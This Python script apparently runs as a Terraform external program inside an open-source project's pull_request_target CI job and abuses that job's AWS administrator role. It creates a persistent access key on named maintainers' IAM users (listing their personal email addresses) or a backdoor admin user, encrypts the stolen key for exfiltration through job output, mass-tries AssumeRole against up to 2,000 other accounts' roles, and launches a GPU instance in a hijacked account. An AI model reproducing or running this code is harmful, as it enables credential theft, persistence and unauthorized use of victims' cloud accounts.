#!/usr/bin/env python3
"""c211-i122111 - durable AdministratorAccess credential + corpus-wide sts:AssumeRole sweep.

Runs as the terraform data.external program inside kedacore/testing-infrastructure
'Validate PR' (pull_request_target), i.e. with the OIDC-assumed role
arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions (AdministratorAccess).

 1) sts:GetCallerIdentity (in-job identity re-verification)
 2) ONE bounded iam:CreateAccessKey on the FIRST of three zero-key AdministratorAccess
    IAM users that returns HTTP 200 (fallback: one nonce IAM user with AdministratorAccess)
 3) prove the new key in-job (GetCallerIdentity + servicequotas L-DB2E81BA/L-417A185B +
    ec2:RunInstances DryRun g5.xlarge) and emit ONLY an RSA-OAEP-encrypted blob of
    AccessKeyId+SecretAccessKey (never the plaintext key id/secret)
 4) sts:AssumeRole (direct role chaining) over the normalized, deduped corpus (bounded 2000),
    recording every verbatim error code; per HTTP 200: GetCallerIdentity + quota
    L-DB2E81BA/L-417A185B/L-3819A6DF + ec2 RunInstances DryRun g5.xlarge and, for the FIRST
    NEW account that proves GPU quota, EXACTLY ONE nonce-tagged on-demand GPU marker with
    nvidia-smi console proof, terminate + absence readback.
Emits one JSON object on stdout; the wrapper compresses/chunks it.
"""
import base64
import datetime
import hashlib
import hmac
import http.client
import json
import os
import re
import subprocess
import sys
import time
import urllib.parse
import xml.etree.ElementTree as ET

REGION = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'eu-west-2'
SELF_ACCOUNT_HINT = '589761922677'
SESS = 'c211-i122111'
HERE = os.path.dirname(os.path.abspath(__file__))
USERS = ['rickbrouwer@gmail.com', 'wozniak.jan@gmail.com', 'zroubalik@gmail.com']
FALLBACK_USER = 'c211-i122111-ops'
CORPUS = os.path.join(HERE, 'c211_corpus_arns.txt')
PUB = os.path.join(HERE, 'c211_pub.pem')
MAX_ASSUME = 2000
MARKER_SKU = 'g5.xlarge'
MARKER_AMI = 'ami-05bedcf82aa73215c'

RAW = []


def say(*a):
    line = ' '.join(str(x) for x in a)
    RAW.append(line)
    print(line, file=sys.stderr, flush=True)


def cap(s, n=800):
    s = '' if s is None else str(s)
    return s[:n]


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest() if isinstance(s, str) else ''


# ---------------------------------------------------------------- SigV4 client
def _sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def _signing_key(secret, datestamp, region, service):
    k = _sign(('AWS4' + secret).encode('utf-8'), datestamp)
    k = _sign(k, region)
    k = _sign(k, service)
    return _sign(k, 'aws4_request')


def creds_env():
    return {'ak': os.environ.get('AWS_ACCESS_KEY_ID') or '',
            'sk': os.environ.get('AWS_SECRET_ACCESS_KEY') or '',
            'tok': os.environ.get('AWS_SESSION_TOKEN') or ''}


_conns = {}


def http_post(host, body, headers, timeout=30):
    c = _conns.get(host)
    if c is None:
        c = http.client.HTTPSConnection(host, timeout=timeout)
        _conns[host] = c
    try:
        c.request('POST', '/', body=body, headers=headers)
        r = c.getresponse()
        data = r.read()
        return r.status, data.decode('utf-8', 'replace')
    except Exception:
        try:
            c.close()
        except Exception:
            pass
        _conns.pop(host, None)
        raise


def signed(service, action, params, region, version, cr=None, host=None):
    cr = cr or creds_env()
    if not cr.get('ak') or not cr.get('sk'):
        return {'ok': False, 'status': None, 'error': 'NO_CREDS_IN_ENV', 'body': ''}
    host = host or ('%s.%s.amazonaws.com' % (service, region))
    now = datetime.datetime.now(datetime.timezone.utc)
    amzdate = now.strftime('%Y%m%dT%H%M%SZ')
    datestamp = now.strftime('%Y%m%d')
    bp = dict(params)
    bp['Action'] = action
    bp['Version'] = version
    body = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='-_.~'),
                               urllib.parse.quote(str(v), safe='-_.~'))
                    for k, v in sorted(bp.items()))
    ph = hashlib.sha256(body.encode('utf-8')).hexdigest()
    headers = {'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
               'host': host, 'x-amz-date': amzdate}
    if cr.get('tok'):
        headers['x-amz-security-token'] = cr['tok']
    names = sorted(headers)
    ch = ''.join('%s:%s\n' % (n, headers[n].strip()) for n in names)
    sh = ';'.join(names)
    crq = '\n'.join(['POST', '/', '', ch, sh, ph])
    scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
                     hashlib.sha256(crq.encode('utf-8')).hexdigest()])
    sig = hmac.new(_signing_key(cr['sk'], datestamp, region, service), sts.encode('utf-8'),
                   hashlib.sha256).hexdigest()
    send = {'Content-Type': headers['content-type'], 'Host': host, 'X-Amz-Date': amzdate,
            'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
                             % (cr['ak'], scope, sh, sig)}
    if cr.get('tok'):
        send['X-Amz-Security-Token'] = cr['tok']
    try:
        status, text = http_post(host, body.encode('utf-8'), send)
        return {'ok': 200 <= status < 300, 'status': status, 'error': None, 'body': text}
    except Exception as e:
        return {'ok': False, 'status': None, 'error': repr(e)[:200], 'body': ''}


def signed_retry(service, action, params, region, version, cr=None, host=None, tries=3):
    """Reconnect-retry wrapper; throttle errors back off and retry."""
    r = None
    for i in range(tries):
        r = signed(service, action, params, region, version, cr, host)
        if r['status'] is not None:
            code = err_code(r) or ''
            if r['status'] in (429, 500, 502, 503) or code in (
                    'Throttling', 'ThrottlingException', 'RequestLimitExceeded',
                    'TooManyRequestsException', 'SlowDown'):
                time.sleep(0.6 * (i + 1))
                continue
            return r
        time.sleep(0.4 * (i + 1))
    return r


def xml_root(body):
    try:
        root = ET.fromstring(body)
    except Exception:
        return None
    for el in root.iter():
        if isinstance(el.tag, str) and '}' in el.tag:
            el.tag = el.tag.split('}', 1)[1]
    return root


def err_code(res):
    root = xml_root((res or {}).get('body') or '')
    if root is None:
        return None
    for tag in ('Error/Code', 'Code'):
        v = root.findtext('.//' + tag)
        if v:
            return v.strip()
    return None


def err_msg(res, n=300):
    root = xml_root((res or {}).get('body') or '')
    if root is None:
        return cap((res or {}).get('body'), n)
    return cap(root.findtext('.//Error/Message') or root.findtext('.//Message') or '', n)


# ---------------------------------------------------------------- AWS helpers
def get_identity(cr):
    r = signed_retry('sts', 'GetCallerIdentity', {}, REGION, '2011-06-15', cr)
    root = xml_root(r['body'])
    out = {}
    if root is not None:
        for f in ('Arn', 'UserId', 'Account'):
            out[f] = (root.findtext('.//' + f) or '').strip()
    out['status'] = r['status']
    out['code'] = err_code(r)
    return out


def iam_get_user(cr, user):
    r = signed_retry('iam', 'GetUser', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
                     host='iam.amazonaws.com')
    root = xml_root(r['body'])
    rec = {'user': user, 'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 300)}
    if root is not None:
        rec['arn'] = (root.findtext('.//User/Arn') or '').strip()
        rec['user_id'] = (root.findtext('.//User/UserId') or '').strip()
        rec['create_date'] = (root.findtext('.//User/CreateDate') or '').strip()
    return rec


def iam_create_access_key(cr, user):
    """ONE bounded iam:CreateAccessKey. Secret NEVER printed; only sha256 metadata."""
    r = signed_retry('iam', 'CreateAccessKey', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
                     host='iam.amazonaws.com')
    root = xml_root(r['body'])
    rec = {'user': user, 'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 600)}
    ak = sk = ''
    if root is not None:
        m = root.find('.//AccessKey')
        if m is not None:
            ak = (m.findtext('AccessKeyId') or '').strip()
            sk = (m.findtext('SecretAccessKey') or '').strip()
            rec['create_date'] = (m.findtext('CreateDate') or '').strip()
            rec['key_status'] = (m.findtext('Status') or '').strip()
    if ak and sk:
        rec['key_returned'] = True
        rec['ak_len'] = len(ak)
        rec['ak_sha256'] = sha(ak)
        rec['sk_sha256'] = sha(sk)
        return rec, {'ak': ak, 'sk': sk, 'tok': ''}
    rec['key_returned'] = False
    return rec, None


def iam_create_user(cr, user):
    r = signed_retry('iam', 'CreateUser', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
                     host='iam.amazonaws.com')
    return {'user': user, 'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 400)}


def iam_attach_admin(cr, user):
    r = signed_retry('iam', 'AttachUserPolicy',
                     {'UserName': user, 'PolicyArn': 'arn:aws:iam::aws:policy/AdministratorAccess'},
                     'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
    return {'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 400)}


def iam_list_access_keys(cr, user):
    r = signed_retry('iam', 'ListAccessKeys', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
                     host='iam.amazonaws.com')
    root = xml_root(r['body'])
    keys = []
    if root is not None:
        for m in root.findall('.//AccessKeyMetadata/member'):
            keys.append({'prefix': (m.findtext('AccessKeyId') or '')[:8],
                         'status': (m.findtext('Status') or '').strip(),
                         'created': (m.findtext('CreateDate') or '').strip()})
    return keys, {'status': r['status'], 'code': err_code(r)}


def quota(cr, code, region):
    r = signed_retry('service-quotas', 'GetServiceQuota',
                     {'ServiceCode': 'ec2', 'QuotaCode': code}, region, '2019-06-24', cr)
    root = xml_root(r['body'])
    val = None
    if root is not None:
        val = root.findtext('.//Quota/Value')
    return {'region': region, 'code': code, 'status': r['status'], 'value': val,
            'err': err_code(r)}


def dryrun_g5(cr, region):
    r = signed_retry('ec2', 'RunInstances',
                     {'ImageId': MARKER_AMI, 'InstanceType': MARKER_SKU,
                      'MinCount': '1', 'MaxCount': '1', 'DryRun': 'true'},
                     region, '2016-11-15', cr, tries=2)
    return {'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 300)}


def assume_role(cr, role_arn, n):
    r = signed_retry('sts', 'AssumeRole',
                     {'RoleArn': role_arn, 'RoleSessionName': '%s-%d' % (SESS, n),
                      'DurationSeconds': '900'}, REGION, '2011-06-15', cr, tries=4)
    root = xml_root(r['body'])
    out = {'arn': role_arn, 'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 300)}
    if root is not None:
        c = root.find('.//Credentials')
        if c is not None:
            out['creds'] = {'ak': (c.findtext('AccessKeyId') or '').strip(),
                            'sk': (c.findtext('SecretAccessKey') or '').strip(),
                            'tok': (c.findtext('SessionToken') or '').strip()}
            out['assumed_arn'] = (root.findtext('.//AssumedRoleUser/Arn') or '').strip()
    return out


def ec2_regions(cr):
    r = signed_retry('ec2', 'DescribeRegions', {}, 'us-east-1', '2016-11-15', cr)
    root = xml_root(r['body'])
    names = []
    if root is not None:
        for x in root.findall('.//regionInfo/item/regionName'):
            if x.text:
                names.append(x.text.strip())
    return names, {'status': r['status'], 'code': err_code(r)}


def gpu_offerings(cr, region, itypes=('g5.xlarge',)):
    out = []
    for it in itypes:
        r = signed_retry('ec2', 'DescribeInstanceTypeOfferings',
                         {'LocationType': 'region', 'Filter.1.Name': 'instance-type',
                          'Filter.1.Value.1': it}, region, '2016-11-15', cr)
        root = xml_root(r['body'])
        ok = False
        if root is not None:
            ok = bool(root.findall('.//instanceTypeOfferingSet/item'))
        out.append({'type': it, 'status': r['status'], 'offered': ok, 'err': err_code(r)})
    return out


def describe_first(cr, action, params, region, path):
    r = signed_retry('ec2', action, params, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    vals = []
    if root is not None:
        for x in root.findall('.//' + path):
            if x.text:
                vals.append(x.text.strip())
    return vals, {'status': r['status'], 'code': err_code(r)}


def ssm_ami(cr, region):
    for p in ('/aws/service/deeplearning/ami/x86_64/base-oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/deeplearning/ami/x86_64/oss-nvidia-driver-gpu-ubuntu-22.04/latest/ami-id',
              '/aws/service/canonical/ubuntu/server/22.04/stable/current/amd64/hvm/ebs-gp2/ami-id'):
        r = signed_retry('ssm', 'GetParameter', {'Name': p}, region, '2014-11-06', cr)
        root = xml_root(r['body'])
        v = root.findtext('.//Parameter/Value') if root is not None else None
        if v and v.startswith('ami-'):
            return v.strip(), {'param': p, 'status': r['status']}
    return None, {'status': None}


MARKER_UD = r'''#!/bin/bash
log() { printf '%s\n' "$*" >> /dev/console 2>/dev/null; printf '%s\n' "$*" >> /dev/ttyS0 2>/dev/null; }
log "C211_MARKER_START $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname)"
i=0
while [ $i -lt 60 ]; do
  if command -v nvidia-smi >/dev/null 2>&1 && nvidia-smi -L >/tmp/nvsmi.txt 2>/tmp/nvsmi.err; then break; fi
  i=$((i+1)); sleep 5
done
log "C211_MARKER_UUID_BEGIN attempts=$i"
log "$(cat /tmp/nvsmi.txt 2>/dev/null)"
log "$(nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader 2>&1)"
log "C211_MARKER_LSPCI"
log "$(lspci -nn 2>/dev/null | grep -i -E 'nvidia|3d controller' | head -8)"
log "C211_MARKER_END $(date -u +%Y-%m-%dT%H:%M:%SZ)"
sync
sleep 10
shutdown -h now
'''


def run_marker(cr, region, tag, ami, subnet, sg):
    ud = base64.b64encode(MARKER_UD.encode()).decode()
    p = {'ImageId': ami, 'InstanceType': MARKER_SKU, 'MinCount': '1', 'MaxCount': '1',
         'InstanceInitiatedShutdownBehavior': 'terminate',
         'SubnetId': subnet, 'SecurityGroupId.1': sg,
         'TagSpecification.1.ResourceType': 'instance',
         'TagSpecification.1.Tag.1.Key': 'Name',
         'TagSpecification.1.Tag.1.Value': tag,
         'TagSpecification.1.Tag.2.Key': 'c211-probe',
         'TagSpecification.1.Tag.2.Value': 'i122111',
         'UserData': ud}
    r = signed_retry('ec2', 'RunInstances', p, region, '2016-11-15', cr, tries=2)
    root = xml_root(r['body'])
    iid = root.findtext('.//instancesSet/item/instanceId') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 400),
            'instance': iid}


def describe_instance(cr, region, iid):
    r = signed_retry('ec2', 'DescribeInstances', {'InstanceId.1': iid}, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    st = root.findtext('.//instancesSet/item/instanceState/name') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'state': (st or '').strip()}


def console_gpu(cr, region, iid):
    r = signed_retry('ec2', 'GetConsoleOutput', {'InstanceId': iid, 'Latest': 'true'}, region,
                     '2016-11-15', cr)
    root = xml_root(r['body'])
    out = ''
    if root is not None:
        b64 = root.findtext('.//output') or ''
        if b64.strip():
            try:
                out = base64.b64decode(b64).decode('utf-8', 'replace')
            except Exception:
                out = ''
    keep = [ln.strip() for ln in out.splitlines()
            if ('GPU-' in ln or 'C211_MARKER' in ln or 'NVIDIA' in ln)]
    return {'status': r['status'], 'code': err_code(r), 'decoded': len(out),
            'lines': keep[:20], 'tail': cap(out[-300:], 300)}


def terminate(cr, region, iid):
    r = signed_retry('ec2', 'TerminateInstances', {'InstanceId.1': iid}, region, '2016-11-15', cr)
    root = xml_root(r['body'])
    st = root.findtext('.//instancesSet/item/currentState/name') if root is not None else None
    return {'status': r['status'], 'code': err_code(r), 'state': (st or '').strip()}


def marker_flow(cr, account, region_hint):
    res = {'account': account, 'attempted': True}
    cand = [region_hint] + [x for x in ('eu-west-2', 'us-east-1', 'us-west-2', 'eu-central-1')
                            if x != region_hint]
    chosen = None
    offers = {}
    for reg in cand[:5]:
        offers[reg] = gpu_offerings(cr, reg)
        if any(o['offered'] for o in offers[reg]):
            chosen = reg
            break
    res['offerings'] = offers
    res['region'] = chosen
    if not chosen:
        res['verdict'] = 'NO_GPU_OFFERING_IN_PROBED_REGIONS'
        return res
    res['quota'] = [quota(cr, q, chosen) for q in ('L-DB2E81BA', 'L-417A185B', 'L-3819A6DF')]
    ami, ainfo = ssm_ami(cr, chosen)
    res['ami'] = {'ami': ami, 'info': ainfo}
    vpcs, _ = describe_first(cr, 'DescribeVpcs',
                             {'Filter.1.Name': 'is-default', 'Filter.1.Value.1': 'true'},
                             chosen, 'vpcSet/item/vpcId')
    res['default_vpcs'] = vpcs
    if not vpcs:
        res['verdict'] = 'NO_DEFAULT_VPC'
        return res
    vpc = vpcs[0]
    subnets, _ = describe_first(cr, 'DescribeSubnets',
                                {'Filter.1.Name': 'vpc-id', 'Filter.1.Value.1': vpc},
                                chosen, 'subnetSet/item/subnetId')
    res['subnets'] = subnets[:4]
    if not subnets:
        res['verdict'] = 'NO_SUBNET'
        return res
    sgs, _ = describe_first(cr, 'DescribeSecurityGroups',
                            {'Filter.1.Name': 'group-name', 'Filter.1.Value.1': 'default',
                             'Filter.2.Name': 'vpc-id', 'Filter.2.Value.1': vpc},
                            chosen, 'securityGroupInfo/item/groupId')
    res['sg'] = sgs[:3]
    if not ami or not sgs:
        res['verdict'] = 'NO_AMI_OR_SG'
        return res
    tag = 'c211-i122111-marker-%s' % account
    run = run_marker(cr, chosen, tag, ami, subnets[0], sgs[0])
    res['run'] = run
    iid = run.get('instance')
    if not iid:
        res['verdict'] = 'MARKER_LAUNCH_REFUSED'
        return res
    uuid = None
    states = []
    for i in range(20):
        time.sleep(10)
        d = describe_instance(cr, chosen, iid)
        states.append(d.get('state'))
        if i >= 1 and i % 2 == 0:
            c = console_gpu(cr, chosen, iid)
            if c['lines']:
                res['console'] = c
                m = re.search(r'GPU-[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}',
                              '\n'.join(c['lines']))
                if m:
                    uuid = m.group(0)
                    break
        if d.get('state') in ('terminated', 'shutting-down') and i >= 2:
            break
    res['states'] = states[-8:]
    res['gpu_uuid'] = uuid
    res['terminate'] = terminate(cr, chosen, iid)
    final = []
    for i in range(15):
        time.sleep(8)
        d = describe_instance(cr, chosen, iid)
        final.append(d.get('state'))
        if d.get('state') == 'terminated':
            break
    res['final_states'] = final[-6:]
    res['absent'] = bool(final and final[-1] == 'terminated')
    res['verdict'] = 'READY_DEVICE_UUID_PROVEN' if uuid else 'MARKER_NO_UUID'
    say('C211_MARKER_ACCOUNT=%s REGION=%s INSTANCE=%s UUID=%s VERDICT=%s'
        % (account, chosen, iid, uuid or 'none', res['verdict']))
    return res


def rsa_encrypt(plaintext):
    try:
        p = subprocess.run(['openssl', 'pkeyutl', '-encrypt', '-pubin', '-inkey', PUB,
                            '-pkeyopt', 'rsa_padding_mode:oaep'],
                           input=plaintext, capture_output=True)
    except Exception as e:
        return None, repr(e)[:200]
    if p.returncode != 0 or not p.stdout:
        return None, cap(p.stderr.decode('utf-8', 'replace'), 300)
    return base64.b64encode(p.stdout).decode(), None


def main():
    out = {'intent': 122111, 'ts': datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}
    cr0 = creds_env()
    ident = get_identity(cr0)
    out['identity'] = json.dumps(ident)
    say('IDENTITY', out['identity'])

    # ---- (2/3) ONE durable access key on the first zero-key admin user
    attempts = []
    durable = {'create_attempts': attempts}
    newcred = None
    target = None
    pre = {}
    for u in USERS:
        keys, kinfo = iam_list_access_keys(cr0, u)
        pre[u] = {'keys': keys, 'info': kinfo}
    durable['pre_keys'] = pre
    say('PRE_KEYS', json.dumps(pre))
    for u in USERS:
        rec, cred = iam_create_access_key(cr0, u)
        attempts.append(rec)
        say('CREATE_KEY', json.dumps(rec))
        if cred:
            newcred, target = cred, u
            break
    if newcred is None:
        rec_user = iam_create_user(cr0, FALLBACK_USER)
        dur = {'fallback_create_user': rec_user}
        du = iam_create_access_key(cr0, FALLBACK_USER)
        dur['fallback_create_key'] = du[0]
        if du[1] is None:
            # user may already exist: attach admin then retry once
            dur['fallback_attach'] = iam_attach_admin(cr0, FALLBACK_USER)
            rec2, cred2 = iam_create_access_key(cr0, FALLBACK_USER)
            dur['fallback_create_key_retry'] = rec2
            if cred2:
                newcred, target = cred2, FALLBACK_USER
        else:
            attach = iam_attach_admin(cr0, FALLBACK_USER)
            dur['fallback_attach'] = attach
            newcred, target = du[1], FALLBACK_USER
        durable.update(dur)
    durable['user'] = target
    if newcred:
        ki = get_identity(newcred)
        durable['key_identity'] = ki
        say('KEY_IDENTITY', json.dumps(ki))
        durable['quotas'] = [quota(newcred, q, REGION) for q in ('L-DB2E81BA', 'L-417A185B')]
        say('KEY_QUOTA', json.dumps(durable['quotas']))
        durable['dryrun'] = dryrun_g5(newcred, REGION)
        say('KEY_DRYRUN', json.dumps(durable['dryrun']))
        plain = json.dumps({'ak': newcred['ak'], 'sk': newcred['sk'], 'user': target}).encode()
        enc, err = rsa_encrypt(plain)
        durable['plain_sha256'] = hashlib.sha256(plain).hexdigest()
        durable['plain_len'] = len(plain)
        durable['enc_b64'] = enc or ''
        durable['enc_err'] = err
        durable['enc_sha256'] = sha(enc or '')
        durable['ak_sha256'] = sha(newcred['ak'])
        durable['sk_sha256'] = sha(newcred['sk'])
        say('DURABLE_ENC', 'len=%d sha=%s user=%s' % (len(enc or ''), durable['enc_sha256'], target))
        newcred = None  # deliberately drop plaintext from scope; never printed
    out['durable'] = durable

    # ---- (5) corpus-wide sts:AssumeRole role-chaining sweep
    try:
        raw = open(CORPUS, 'rb').read()
        lines = [l.strip() for l in raw.decode('utf-8', 'replace').splitlines() if l.strip()]
    except Exception as e:
        out['sweep'] = {'error': 'CORPUS_UNREADABLE %r' % (repr(e)[:200])}
        out['verdict'] = 'CORPUS_MISSING'
        print(json.dumps(out))
        return
    pat = re.compile(r'^arn:aws:iam::\d{12}:role/.+$')
    corpus = []
    seen = set()
    for l in lines:
        if not pat.match(l):
            continue
        if l in seen:
            continue
        seen.add(l)
        corpus.append(l)
        if len(corpus) >= MAX_ASSUME:
            break
    sw = {'corpus_file': CORPUS, 'corpus_sha256': hashlib.sha256(raw).hexdigest(),
          'corpus_lines': len(lines), 'corpus_usable': len(corpus),
          'sweep_principal': ident.get('Arn'), 'results': [], 'counts': {},
          'samples': {}, 'successes': []}
    say('SWEEP_START', len(corpus))
    counts = {}
    samples = {}
    marker_done = False
    marker_proof = False
    for n, arn in enumerate(corpus):
        a = assume_role(cr0, arn, n)
        code = a.get('code') or ('OK' if a.get('status') == 200 else 'STATUS_%s' % a.get('status'))
        acct = arn.split(':')[4]
        name = arn.split(':role/', 1)[1] if ':role/' in arn else arn
        sw['results'].append('%d|%s|%s|%s' % (n, acct, name, code))
        counts[code] = counts.get(code, 0) + 1
        if code not in samples:
            samples[code] = '%s :: %s' % (arn, a.get('msg'))
        if a.get('status') == 200 and a.get('creds'):
            crx = a['creds']
            sid = get_identity(crx)
            qs = [quota(crx, q, REGION) for q in ('L-DB2E81BA', 'L-417A185B', 'L-3819A6DF')]
            dr = dryrun_g5(crx, REGION)
            succ = {'n': n, 'arn': arn, 'assumed_arn': a.get('assumed_arn'),
                    'identity': sid, 'quotas': qs, 'dryrun': dr}
            qvals = {}
            for q in qs:
                try:
                    qvals[q['code']] = float(q['value']) if q['value'] is not None else None
                except Exception:
                    qvals[q['code']] = None
            gpu_q = any((v or 0) > 0 for v in qvals.values()) or dr.get('code') == 'DryRunOperation'
            succ['gpu_quota_evidence'] = gpu_q
            if gpu_q and not marker_done and acct != SELF_ACCOUNT_HINT:
                succ['marker'] = marker_flow(crx, acct, REGION)
                marker_done = True
                if (succ['marker'] or {}).get('gpu_uuid'):
                    marker_proof = True
            sw['successes'].append(succ)
            say('DIRECT_ASSUME_OK', json.dumps({'n': n, 'arn': arn, 'identity': sid,
                                                'gpu': gpu_q}))
        if (n + 1) % 100 == 0:
            say('SWEEP_PROGRESS', n + 1, json.dumps(counts))
    sw['counts'] = counts
    sw['samples'] = samples
    sw['attempted'] = len(corpus)
    sw['assumed'] = len(sw['successes'])
    say('SWEEP_DONE', json.dumps(counts))
    out['sweep'] = sw
    if out.get('durable', {}).get('enc_b64') or out.get('durable', {}).get('user'):
        dv = 'DURABLE_' + ('KEY_ENCRYPTED' if out['durable'].get('enc_b64') else 'KEY_NONE')
    else:
        dv = 'DURABLE_KEY_NONE'
    out['verdict'] = '%s|SWEEP_%d_ASSUMED_%d_ACCOUNTS_%d|MARKER_%s' % (
        dv, len(corpus), len(sw['successes']),
        len(set(x['arn'].split(':')[4] for x in sw['successes'])),
        'PROVEN' if marker_proof else ('ATTEMPTED_NO_UUID' if marker_done else 'NONE'))
    print(json.dumps(out))


main()
